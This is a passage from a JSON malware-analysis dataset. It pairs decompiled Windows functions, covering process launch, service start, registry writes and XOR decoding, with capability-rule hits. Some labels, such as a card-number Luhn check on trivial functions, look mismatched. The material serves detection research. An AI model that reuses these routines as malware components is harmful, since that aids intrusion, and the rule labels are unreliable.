0x4112dc);\n    if (((*0x423664 != 0) && (*0x423668 != 0)) && (*0x42366c != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 406
    },
    "00403d20": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403d6f) overlaps instruction at (ram,0x00403d6e)\n// \n// WARNING: Removing unreachable block (ram,0x00403d68)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403d20(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t *puVar4;\n    char *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    ushort extraout_var;\n    uint32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uint *puVar8;\n    uchar uVar9;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar10;\n    ushort uStack560;\n    ushort uStack558;\n    ushort uStack556;\n    char cStack554;\n    uchar uStack553;\n    ushort uStack552;\n    uint16_t uStack550;\n    uint8_t uStack548;\n    uchar uStack547;\n    ushort uStack546;\n    uchar *puStack544;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint s;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    s._0_1_ = 0;\n    puVar8 = &var_20fh;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    puVar8 = &s + 1;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    puVar1 = puVar8 + 3;\n    *(puVar8 + 2) = 0;\n    uVar9 = 0;\n    puStack544 = &lpBuffer;\n    uStack548 = 0x80;\n    uStack547 = 0x3d;\n    uStack546 = 0x40;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uStack548 = arg_8h;\n    uStack547 = arg_8h >> 8;\n    uStack546 = arg_8h >> 0x10;\n    uStack552 = SUB42(&lpBuffer, 0);\n    uStack550 = &lpBuffer >> 0x10;\n    uStack556 = 0x11c0;\n    cStack554 = 0x41;\n    uStack553 = 0;\n    uStack560 = SUB42(&s, 0);\n    uStack558 = &s >> 0x10;\n    puVar4 = (*_sym.imp.MSVCRT.dll_sprintf)();\n    if ((!uVar9) && (uVar9)) {\n        if (*puVar4 <= &uStack560 && puVar4 != 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar3 = fcn.004044b0(&var_4h, &var_8h);\n    if ((uVar9) || (!uVar9)) {\n        uVar3 = fcn.00403e50(var_4h);\n        uStack546 = unaff_EBX;\n    }\n    cVar2 = uVar3 - *puVar1;\n    uStack550 = (in_NT & 1) * 0x4000 | SBORROW1(uVar3, *puVar1) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                (cVar2 < '\\0') * 0x80 | (cVar2 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar2) & 1U) == 0) * 4\n                | uVar3 < *puVar1;\n    uStack548 = (in_ID & 1) * 0x200000 >> 0x10 | (in_VIP & 1) * 0x100000 >> 0x10 | (in_VIF & 1) * 0x80000 >> 0x10 |\n                (in_AC & 1) * 0x40000 >> 0x10;\n    uStack547 = 0;\n    cStack554 = 0xe1;\n    uStack553 = 0x3d;\n    uStack552 = 0x40;\n    pcVar5 = func_0x10189d59();\n    cStack554 = pcVar5;\n    uStack553 = pcVar5 >> 8;\n    uStack552 = pcVar5 >> 0x10;\n    uStack558 = unaff_EBX + 0xe850fc45;\n    uStack556 = unaff_EBX + 0xe850fc45 >> 0x10;\n    *pcVar5 = *pcVar5 + cStack554;\n    *(unaff_EBX + 0x53661cc4) = *(unaff_EBX + 0x53661cc4) + cStack554;\n    puVar1 = unaff_EBX & 0xffff0000 | puVar8 + 1 & 0xffff;\n    uStack560 = extraout_var;\n    uVar10 = fcn.00402d40(*0x10 + -0x110, var_4h, var_8h, puVar8 + 1 >> 0x10, unaff_ESI + -1 >> 0x10, \n                          &stack0xfffffffc >> 0x10, &uStack550 >> 0x10);\n    iVar7 = uVar10;\n    if (iVar7 != 0) {\n        if ((-1 < iVar7) && (-1 >= iVar7)) {\n            *puVar1 = *puVar1 & 0xc3;\n    // WARNING: Could not recover jumptable at 0x00403e36. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar6 = (**((uVar10 >> 0x20) + -1))();\n            return uVar6;\n        }\n        fcn.00401420(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1554
    },
    "00404d20": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404d20(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar1;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    iVar1 = fcn.00404980(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = arg_ch;\n    fcn.00404980(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 162
    },
    "004024c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402516) overlaps instruction at (ram,0x00402512)\n// \n// WARNING: Removing unreachable block (ram,0x004024e8)\n// WARNING: Removing unreachable block (ram,0x004024cd)\n\ncode * fcn.004024c0(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    code *pcVar6;\n    uint8_t uVar7;\n    int32_t *unaff_EDI;\n    bool bVar8;\n    uint8_t uVar9;\n    char cVar10;\n    char cVar11;\n    uchar **ppuStack4;\n    \n    ppuStack4 = &ppuStack4;\n    puVar4 = (*_sym.imp.MSVCRT.dll_fopen)(param_1, param_2);\n    if (puVar4 == NULL) {\n        return NULL;\n    }\n    uVar1 = *puVar4;\n    *unaff_EDI = puVar4 + 1;\n    bVar8 = 0x74 < *0x9750e2b5;\n    uVar7 = uVar1 >> 0x1f;\n    uVar3 = *0x8bb8ec96 + uVar7;\n    uVar9 = CARRY1(*0x8bb8ec96, uVar7) || CARRY1(uVar3, bVar8);\n    cVar11 = SCARRY1(*0x8bb8ec96, uVar7) != SCARRY1(uVar3, bVar8);\n    *0x8bb8ec96 = uVar3 + bVar8;\n    cVar10 = *0x8bb8ec96 < '\\0';\n    bVar8 = *0x8bb8ec96 == '\\0';\n    uVar5 = (*_sym.imp.MSVCRT.dll_fwrite)(*0x9750e2b5 & 0xffffff00 | *0x9750e2b5 + 0x8b, 1);\n    if ((bVar8 || cVar11 != cVar10) || (!bVar8 && cVar11 == cVar10)) {\n        pcVar6 = (*_sym.imp.MSVCRT.dll_fflush)(0x8bb8ec44);\n    }\n    else {\n        uVar2 = uVar9;\n        uVar9 = 0xffbf9ef7 < uVar5 || CARRY4(sym.imp.MSVCRT.dll_fflush + uVar5, uVar2);\n        pcVar6 = sym.imp.MSVCRT.dll_fflush + uVar5 + uVar2;\n    }\n    if ((!uVar9) && (uVar9)) {\n        out(0xbd, pcVar6);\n        return pcVar6;\n    }\n    (*_sym.imp.MSVCRT.dll_fclose)(0x8bb8ec44);\n    return 0x1;\n}\n",
        "token_count": 668
    },
    "004029b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402a1b) overlaps instruction at (ram,0x00402a19)\n// \n// WARNING: Removing unreachable block (ram,0x00402a1b)\n// WARNING: Removing unreachable block (ram,0x00402a1e)\n\nvoid __cdecl fcn.004029b0(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uchar *unaff_EDI;\n    uchar *puVar3;\n    \n    uVar1 = 0;\n    if (arg_14h != 0) {\n        do {\n            uVar2 = *(uVar1 + arg_10h) ^ *(uVar1 % arg_ch + arg_8h);\n            if ((-1 < uVar2) && (-1 >= uVar2)) {\n                arg_10h = arg_10h + -1;\n                puVar3 = unaff_EDI | &stack0xfffffffc;\n                unaff_EDI = puVar3 + 1;\n                *puVar3 = arg_8h;\n            }\n            *(uVar1 + arg_10h) = uVar2;\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 313
    },
    "00402a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00402a70(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00402e70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e90) overlaps instruction at (ram,0x00402e8e)\n// \n\nchar * __cdecl fcn.00402e70(char *arg_8h, char *arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *unaff_EDI;\n    char *pcVar4;\n    bool bVar5;\n    bool bVar6;\n    \n    bVar6 = SCARRY4(arg_8h - arg_14h, arg_ch);\n    pcVar2 = arg_ch + (arg_8h - arg_14h);\n    if ((bVar6 == pcVar2 < 0) && (bVar6 != pcVar2 < 0)) {\n        bVar6 = arg_ch < 0x5174f685;\n        bVar5 = arg_ch == 0x5174f685;\n    }\n    else {\n        bVar6 = false;\n        bVar5 = arg_14h == 0;\n        arg_ch = arg_8h;\n        if (bVar5) {\n            return arg_8h;\n        }\n    }\n    if ((!bVar6 && !bVar5) && (bVar6 || bVar5)) {\n        arg_ch = unaff_EDI;\n    }\n    do {\n        if (pcVar2 < arg_ch) {\n            return NULL;\n        }\n        if (*arg_ch == *arg_10h) {\n            iVar1 = arg_14h + -1;\n            bVar6 = true;\n            pcVar4 = arg_10h + 1;\n            pcVar3 = arg_ch;\n            do {\n                pcVar3 = pcVar3 + 1;\n                if (iVar1 == 0) break;\n                iVar1 = iVar1 + -1;\n                bVar6 = *pcVar3 == *pcVar4;\n                pcVar4 = pcVar4 + 1;\n            } while (bVar6);\n            if (bVar6) {\n                return arg_ch;\n            }\n        }\n        arg_ch = arg_ch + 1;\n    } while( true );\n}\n",
        "token_count": 485
    },
    "00402f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402f00(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00403760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get Program Files directory"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040388e) overlaps instruction at (ram,0x0040388c)\n// \n// WARNING: Removing unreachable block (ram,0x0040388b)\n// WARNING: Removing unreachable block (ram,0x00403818)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00403760(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint *puVar3;\n    uchar uStack612;\n    uint uStack611;\n    uchar uStack352;\n    uint uStack351;\n    uint auStack92 [11];\n    uint uStack48;\n    ushort uStack44;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    while( true ) {\n        fcn.004021f0();\n        iVar2 = fcn.00402f30();\n        if (iVar2 == 0) {\n            return;\n        }\n        uStack612 = 0;\n        puVar3 = &uStack611;\n        for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        iVar2 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &uStack612, 0x26, 0);\n        if (iVar2 == 0) break;\n        if ((iVar2 < 1) || (0 < iVar2)) {\n            fcn.00402460();\n            uStack352 = 0;\n            puVar3 = &uStack351;\n            for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *puVar3 = 0;\n            *(puVar3 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&uStack352, 0x411548, &uStack612, 0x411528, 3);\n            iStack24 = 0;\n            while( true ) {\n                puVar3 = auStack92;\n                for (iVar2 = 0x11; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar3 = 0;\n                    puVar3 = puVar3 + 1;\n                }\n                uStack20 = 0;\n                auStack92[0] = 0x44;\n                uStack16 = 0;\n                uStack48 = 1;\n                uStack12 = 0;\n                uStack44 = 0;\n                uStack8 = 0;\n                iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &uStack352, 0, 0, 0, 0, 0, 0, auStack92, &uStack20);\n                if (iVar2 == 0) break;\n                (*_sym.imp.KERNEL32.dll_Sleep)(0xb8);\n                (*_sym.imp.USER32.dll_EnumWindows)(0x3660, uStack12);\n                iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uStack20, 0xe8);\n                if (iVar2 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack20, 1);\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack16);\n                (*pcVar1)(uStack20);\n                iStack24 = iStack24 + 1;\n                if (0 < iStack24) {\n                    return;\n                }\n            }\n            return;\n        }\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    return;\n}\n",
        "token_count": 942
    },
    "00403af0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403b34) overlaps instruction at (ram,0x00403b31)\n// \n// WARNING: Removing unreachable block (ram,0x00403b2b)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403af0(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 304
    },
    "004044b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004044ce)\n// WARNING: Removing unreachable block (ram,0x004044d6)\n\nvoid __cdecl fcn.004044b0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00404350(&var_68h, &var_4h);\n    fcn.004029b0(&var_68h, var_4h, 0x41162c, 0x12000);\n    *arg_8h = 0x41162c;\n    *arg_ch = 0x12000;\n    return;\n}\n",
        "token_count": 272
    },
    "004047d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004047d0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403b80(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 54
    },
    "00402a30": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402a45) overlaps instruction at (ram,0x00402a40)\n// \n\nvoid __fastcall fcn.00402a30(uint param_1, uint8_t *param_2, int32_t param_3)\n\n{\n    int32_t in_EAX;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    \n    if ((in_ZF || in_OF != in_SF) || (!in_ZF && in_OF == in_SF)) {\n        in_EAX = param_3;\n    }\n    *(in_EAX + -0x74c625aa) = *(in_EAX + -0x74c625aa) ^ param_1;\n    *param_2 = *param_2 | param_1 >> 8;\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(in_EAX, 0xc0000000, 1, 0, 3, 0x80);\n    return;\n}\n",
        "token_count": 217
    },
    "00402610": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402662) overlaps instruction at (ram,0x00402661)\n// \n// WARNING: Removing unreachable block (ram,0x00402652)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00402610(int32_t param_1, int32_t param_2, int32_t *param_3, int32_t param_4)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    iVar2 = 0;\n    if (0 < param_4) {\n        do {\n            uVar1 = *(iVar2 + param_3) ^ *(iVar2 % param_2 + param_1);\n            piVar3 = param_3;\n            if ((-1 < uVar1) && (-1 >= uVar1)) {\n                out(0xc4, param_1);\n                piVar3 = param_3 + 1;\n                *param_3 = param_1;\n            }\n            *(iVar2 + piVar3) = param_4 ^ uVar1;\n            iVar2 = iVar2 + 1;\n            param_3 = piVar3;\n        } while (iVar2 < param_4);\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "00404ae0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00404ae0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x411374, 0x4113b8, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 80
    }
}